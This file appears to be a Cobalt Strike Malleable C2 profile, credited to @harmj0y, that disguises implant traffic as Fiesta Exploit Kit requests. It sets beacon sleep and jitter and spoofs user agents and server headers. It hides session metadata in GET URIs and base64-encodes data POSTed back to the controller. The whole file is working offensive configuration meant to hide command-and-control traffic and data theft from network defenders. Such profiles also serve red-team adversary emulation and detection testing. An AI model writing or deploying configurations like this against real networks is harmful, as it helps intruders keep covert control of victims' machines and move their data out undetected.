#
# Fiesta Exploit Kit traffic profile
#   http://malware-traffic-analysis.net/2014/04/05/index.html
#
# Author: @harmj0y
#

set sleeptime "30000"; # use a ~30s delay between callbacks
set jitter    "10"; # throw in a 10% jitter
set maxdns    "255";
set useragent "Mozilla/4.0 (Windows 7 6.1) Java/1.7.0_11";

http-get {

    set uri "/rmvk30g/";

    client {
        # mimic this Fiesta instance's header information
        header "Accept" "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2";
        header "Connection" "keep-alive";

        # encode session metadata as close as we can to a Fiesta URI request
        metadata {
            netbios;
            append ";1;4;1";
            uri-append;
        }
    }

    server {
        header "Server" "Apache/2.2.15 (CentOS)";
        header "X-Powered-By" "PHP/5.3.27";
        header "Content-Type" "application/octet-stream";
        header "Connection" "close";

        output {
            print;
        }
    }
}

http-post {

    set uri "/";

    client {
    
        # fake out a different user agent for the post back
        header "User-Agent" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E)";

        id {
            netbios;
            uri-append;
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Server" "nginx/1.4.2";
        header "Content-Type" "text/html";
        header "Connection" "close";

        output {
            base64;
            print;
        }
    }
}

